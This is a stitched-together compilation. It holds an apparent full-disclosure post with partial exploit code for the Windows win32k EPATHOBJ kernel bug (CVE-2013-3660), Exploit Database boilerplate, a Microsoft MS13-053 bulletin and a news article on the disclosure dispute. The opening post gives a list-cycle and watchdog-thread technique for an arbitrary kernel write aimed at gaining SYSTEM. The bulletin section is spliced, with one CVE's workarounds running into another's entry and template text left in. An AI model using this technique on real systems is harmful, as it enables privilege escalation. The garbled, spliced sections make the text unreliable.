**Vulnerable App:**

```
I'm quite proud of this list cycle trick, here's how to turn it into an
arbitrary write.

First, we create a watchdog thread that will patch the list atomically
when we're ready. This is needed because we can't exploit the bug while
HeavyAllocPool is failing, because of the early exit in pprFlattenRec:

.text:BFA122B8                 call newpathrec              ; EPATHOBJ::newpathrec(_PATHRECORD * *,ulong *,ulong)
.text:BFA122BD                 cmp     eax, 1               ; Check for failure
.text:BFA122C0                 jz      short continue
.text:BFA122C2                 xor     eax, eax             ; Exit early
.text:BFA122C4                 jmp     early_exit

So we create a list node like this:

PathRecord->Next    = PathRecord;
PathRecord->Flags   = 0;

Then EPATHOBJ::bFlatten() spins forever doing nothing:

BOOL __thiscall EPATHOBJ::bFlatten(EPATHOBJ *this)
{
    /* ... */

    for ( ppr = ppath->pprfirst; ppr; ppr = ppr->pprnext )
    {
      if ( ppr->flags & PD_BEZIER )
      {
        ppr = EPATHOBJ::pprFlattenRec(pathobj, ppr);
      }
    }

    /* ... */
}

While it's spinning, we clean up in another thread, then patch the thread (we
can do this, because it's now in userspace) to trigger the exploit. The first
block of pprFlattenRec does something like this:

    if ( pprNew->pprPrev )
      pprNew->pprPrev->pprnext = pprNew;

Let's make that write to 0xCCCCCCCC.

DWORD WINAPI WatchdogThread(LPVOID Parameter)
{

    // This routine waits for a mutex object to timeout, then patches the
    // compromised linked list to point to an exploit. We need to do this.
    LogMessage(L_INFO, "Watchdog thread %u waiting on Mutex () %p",
                       GetCurrentThreadId(),
                       Mutex);

    if (WaitForSingleObject(Mutex, CYCLE_TIMEOUT) == WAIT_TIMEOUT) {
        // It looks like the main thread is stuck in a call to FlattenPath(),
        // because the kernel is spinning in EPATHOBJ::bFlatten(). We can clean
        // up, and then patch the list to trigger our exploit.
        while (NumRegion--)
            DeleteObject(Regions[NumRegion]);

        LogMessage(L_ERROR, "InterlockedExchange(%p, %p);", &PathRecord->next, &ExploitRecord);

        InterlockedExchangePointer(&PathRecord->next, &ExploitRecord);

    } else {
        LogMessage(L_ERROR, "Mutex object did not timeout, list not patched");
    }

    return 0;
}

    PathRecord->next    = PathRecord;
    PathRecord->prev    = (PVOID)(0x42424242);
    PathRecord->flags   = 0;

    ExploitRecord.next  = NULL;
    ExploitRecord.prev  = 0xCCCCCCCC;
    ExploitRecord.flags = PD_BEZIERS;

Here's the output on Windows 8:

Demo code attached. I have a working exploit that grants SYSTEM on all
currently supported versions of Windows. Code is available on request to
students from reputable schools.

If nobody else on the list can figure out the final details, then I've
lost faith in the next generation ;)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Microsoft Security Bulletin MS13-053 - Critical

## Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851)

Published: July 09, 2013

**Version:** 1.0

### General Information

#### Executive Summary

This security update resolves two publicly disclosed and six privately reported vulnerabilities in Microsoft Windows. The most severe vulnerability could allow remote code execution if a user views shared content that embeds TrueType font files. An attacker who successfully exploited this vulnerability could take complete control of an affected system.

This security update is rated Critical for all supported releases of Microsoft Windows. For more information, see the subsection, **Affected and Non-Affected Software**, in this section.

The security update addresses these vulnerabilities by correcting the way Windows handles specially crafted TrueType Font (TTF) files and by correcting the way that Windows handles objects in memory. For more information about the vulnerabilities, see the Frequently Asked Questions (FAQ) subsection for the specific vulnerability entry under the next section, **Vulnerability Information**.

**Recommendation.**  Most customers have automatic updating enabled and will not need to take any action because this security update will be downloaded and installed automatically. Customers who have not enabled automatic updating need to check for updates and install this update manually. For information about specific configuration options in automatic updating, see [Microsoft Knowledge Base Article 294871](https://support.microsoft.com/kb/294871).

For administrators and enterprise installations, or end users who want to install this security update manually, Microsoft recommends that customers apply the update immediately using update management software, or by checking for updates using the [Microsoft Update](https://go.microsoft.com/fwlink/?linkid=40747) service.

See also the section, **Detection and Deployment Tools and Guidance**, later in this bulletin.

## TrueType Font Parsing Vulnerability - CVE-2013-3129

A remote code execution vulnerability exists in the way that affected components handle specially crafted TrueType font files. The vulnerability could allow remote code execution if a user opens a specially crafted TrueType font file. An attacker who successfully exploited this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full administrative rights.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2013-3129](https://www.cve.org/CVERecord?id=CVE-2013-3129).

#### Mitigating Factors

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* In a web browsing attack scenario, an attacker could host a website that contains a webpage that is used to exploit this vulnerability. In addition, compromised websites and websites that accept or host user-provided content or advertisements could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these websites. Instead, an attacker would have to convince users to visit the website, typically by getting them to click a link in an email message or Instant Messenger message that takes users to the attacker's website.
* By default, all supported versions of Microsoft Outlook, Microsoft Outlook Express, and Windows Mail open HTML email messages in the Restricted sites zone, which disables font download by default. If a user clicks a link in an email message, the user could still be vulnerable to exploitation of this vulnerability through the web-based attack scenario. The vulnerability could also be exploited if a user opens an attachment that is sent in an email message.
* The malicious file could be sent as an email attachment, but the attacker would have to convince the user to open the attachment in order to exploit the vulnerability.

#### Workarounds

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality: **OR** Microsoft has not identified any workarounds for this vulnerability.

* **Disable the** **WebClient** **service**

  Disabling the WebClient service helps protect affected systems from attempts to exploit this vulnerability by blocking the most likely remote attack vector through the Web Distributed Authoring and Versioning (WebDAV) client service. After applying this workaround it is still possible for remote attackers who successfully exploit this vulnerability to cause the system to run programs located on the targeted user's computer or the Local Area Network (LAN), but users will be prompted for confirmation before opening arbitrary programs from the Internet.

  To disable the WebClient Service, follow these steps:

  1. Click **Start**, click **Run**, type **Services.msc** and then click **OK**.
  2. Right-click **WebClient** **service** and select **Properties**.
  3. Change the **Startup** **type** **to** **Disabled**. If the service is running, click **Stop**.
  4. Click **OK** and exit the management application.

  **Impact of workaround.** When the WebClient service is disabled, Web Distributed Authoring and Versioning (WebDAV) requests are not transmitted. In addition, any services that explicitly depend on the Web Client service will not start, and an error message will be logged in the System log. For example, WebDAV shares will be inaccessible from the client computer.

  **How to undo the workaround.**

  To re-enable the WebClient Service, follow these steps:

  1. Click **Start**, click **Run**, type **Services.msc** and then click **OK**.
  2. Right-click **WebClientservice** and select **Properties**.
  3. Change the **StartuptypetoAutomatic**. If the service is not running, click **Start**.
  4. Click **OK** and exit the management application.
* **Block TCP ports 139 and 445 at the firewall**

  These ports are used to initiate a connection with the affected component. Blocking TCP ports 139 and 445 at the firewall will help protect systems that are behind that firewall from attempts to exploit this vulnerability. Microsoft recommends that you block all unsolicited inbound communication from the Internet to help prevent attacks that may use other ports. For more information about ports, see the TechNet article, [TCP and UDP Port Assignments](https://go.microsoft.com/fwlink/?linkid=21312).

  **Impact of workaround.** Several Windows services use the affected ports. Blocking connectivity to the ports may cause various applications or services to not function. Some of the applications or services that could be impacted are listed below:

  + Applications that use SMB (CIFS)
  + Applications that use mailslots or named pipes (RPC over SMB)
  + Server (File and Print Sharing)
  + Group Policy
  + Net Logon
  + Distributed File System (DFS)
  + Terminal Server Licensing
  + Print Spooler
  + Computer Browser
  + Remote Procedure Call Locator
  + Fax Service
  + Indexing Service
  + Performance Logs and Alerts
  + Systems Management Server
  + License Logging Service

  **How to undo the workaround.** Unblock TCP ports 139 and 445 at the firewall. For more information about ports, see [TCP and UDP Port Assignments](https://go.microsoft.com/fwlink/?linkid=21312).
* **Disable the Preview Pane and Details Pane in Windows Explorer**

  Disabling the Preview and Details panes in Windows Explorer prevents TrueType fonts from being viewed in Windows Explorer. While this prevents malicious files from being viewed in Windows Explorer, it does not prevent a local, authenticated user from running a specially crafted program to exploit this vulnerability.

  To disable these panes in Windows Vista, Windows Server 2008, Windows 7, and Windows Server 2008 R2, perform the following steps:

  1. Open Windows Explorer, click **Organize**, and then click **Layout**.
  2. Clear both the **Details** **pane** and **Preview** **pane** menu options.
  3. Open Windows Explorer, click **Organize**, and then click **Folder** **and** **search** **options**.
  4. Click on the **View** tab
  5. Check the box for **Always** **show** **icons,never** **thumbnails** under **Advanced** **settings**.
  6. Close all open instances of Windows Explorer for the change to take effect.

  **How to undo the workaround.** To re-enable the Windows Explorer Preview and Details panes in Windows Vista, Windows Server 2008, Windows 7, and Windows Server 2008 R2:

  1. Open Windows Explorer, click **Organize**, and then click **Layout**.
  2. Select both the **Details** **pane** and **Preview** **pane** menu options.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2013-3660](https://www.cve.org/CVERecord?id=CVE-2013-3660).

#### Mitigating Factors

Microsoft has not identified any mitigating factors for this vulnerability.

#### Workarounds

Microsoft has not identified any workarounds for this vulnerability.

#### FAQ

**What is the scope of the vulnerability?**

This is a theoretical remote code execution vulnerability. It is more likely that an attacker who successfully exploited this vulnerability could achieve elevation of privileges. Please read the following FAQ for a more complete understanding of this vulnerability.

**What causes the vulnerability?**

The vulnerability is caused when the Windows kernel-mode driver improperly handles objects in memory.

**What is the Windows kernel-mode driver (win32k.sys)?**

Win32k.sys is a kernel-mode device driver and is the kernel part of the Windows subsystem. It contains the window manager, which controls window displays; manages screen output; collects input from the keyboard, mouse, and other devices; and passes user messages to applications. It also contains the Graphics Device Interface (GDI), which is a library of functions for graphics output devices. Finally, it serves as a wrapper for DirectX support that is implemented in another driver (dxgkrnl.sys).

**What is the Windows kernel?**
The Windows kernel is the core of the operating system. It provides system-level services such as device management and memory management, allocates processor time to processes, and manages error handling.

**What might an attacker use the vulnerability to do?**

In most scenarios, an attacker who successfully exploited this vulnerability could achieve elevation of privilege on the target system.

It is also theoretically possible, but unlikely due to memory randomization, that an attacker who successfully exploited this vulnerability could achieve remote code execution. An attacker could then install programs; view, change, or delete data; or create new accounts with full administrative rights.

**Why is code execution unlikely for this issue?**

An attacker who attempts to exploit this issue for code execution would need to write executable content to a specific space in kernel memory. However, since the starting address will be random, the final pointer destination will be difficult to predict. The implementation of Address Space Layout Randomization (ASLR) by default on affected systems further complicates this prediction. In most scenarios, exploit code could much more likely result in elevation of privilege than in code execution.

**How could an attacker exploit the vulnerability?**

There are multiple means that could allow an attacker to exploit this vulnerability:

In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit this vulnerability through Internet Explorer and then convince a user to view the website. The attacker could also take advantage of compromised websites and websites that accept or host user-provided content or advertisements. These websites could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to view the attacker-controlled content. Instead, an attacker would have to convince users to take action, typically by getting them to click a link in an email message or in an Instant Messenger message that takes users to the attacker's website, or by opening an attachment sent through email.

In a local attack scenario, an attacker could also exploit this vulnerability by running a specially crafted application to take complete control over the affected system. However, the attacker must have valid logon credentials and be able to log on locally to exploit this vulnerability in this scenario.

**What systems are primarily at risk from the vulnerability?**

Workstations are primarily at risk.

**What does the update do?**

The update addresses the vulnerability by correcting the way that Windows handles objects in memory.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

Yes. This vulnerability has been publicly disclosed. It has been assigned Common Vulnerability and Exposure number [CVE-2013-3660](https://www.cve.org/CVERecord?id=CVE-2013-3660).

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

Microsoft had not received any information to indicate that this vulnerability had been used to attack customers to achieve remote code execution when this security bulletin was originally issued. Microsoft was aware of this vulnerability being used to achieve elevation of privilege in targeted attacks. Both the remote code execution and elevation of privilege uses of this vulnerability are addressed by this update.

**Does applying this security update help protect customers from the code, published publicly, that attempts to exploit this vulnerability?**

Yes. This security update addresses the vulnerability that could be exploited by using the published proof of concept code.

A Google engineer has once again disclosed a Windows flaw. In a [Full Disclosure posting to the SecLists mailing list](http://seclists.org/fulldisclosure/2013/May/91), Tavis Ormandy — an Information Security Engineer at Google — details a vulnerability in Windows 7 and Windows 8 that can be exploited by local users to gain escalated privileges. Security firm [Secunia notes](http://secunia.com/advisories/53435/) that the issue is "less critical" than other flaws as it's not a remotely exploitable one. Nevertheless, it appears that Ormandy has taken the full disclosure approach, stating he doesn't have "time to work on silly Microsoft code," rather than Microsoft's preferred responsible disclosure route that calls for vulnerabilities to be reported privately.

Ormandy previously revealed a serious vulnerability in Windows XP's Help and Support Center that allowed attackers to compromise machines using specially crafted websites before Microsoft had patched the bug. [Google engineers regularly report flaws in Microsoft software](http://www.theverge.com/2013/2/13/3983846/googlers-found-over-50-percent-of-the-bugs-in-microsofts-massive-update), recently discovering over 50 percent of bugs in one of its biggest "Patch Tuesday" monthly security updates ever. Some security researchers have previously [branded Ormandy "irresponsible,"](http://nakedsecurity.sophos.com/2010/06/15/tavis-ormandy-pleased-website-exploits-microsoft-zeroday/) but his motives may be related to Microsoft's "interesting experience" of dealing with vulnerabilities. In a [blog post days before](http://blog.cmpxchg8b.com/2013/05/introduction-to-windows-kernel-security.html) his most recent disclosure, Ormandy claims Microsoft is "often very difficult to work with," advising researchers to speak to the software maker anonymously. "Microsoft treat vulnerability researchers with great hostility," he says.

"Vulnerability researchers should work closely with Microsoft..."

Graham Cluley, a senior technology consultant at [Sophos](http://www.sophos.com/en-us/), disputes Ormandy's claims. "Generally, Microsoft's security team does an excellent job," says Cluley in an email to *The Verge*. "Vulnerability researchers should work closely with Microsoft to fix problems responsibly, rather than risking assisting malicious hackers." Whether or not Ormandys approach is reasonable is debatable, but Microsoft says it's investigating. "We are aware of claims regarding a potential issue affecting Microsoft Windows and are investigating," said a spokesperson in a [statement issued to Computerworld](http://www.computerworld.com/s/article/9239477/Google_engineer_bashes_Microsoft_s_handling_of_security_researchers_discloses_Windows_zero_day?taxonomyId=85&pageNumber=1). "We will take the appropriate action to protect our customers."
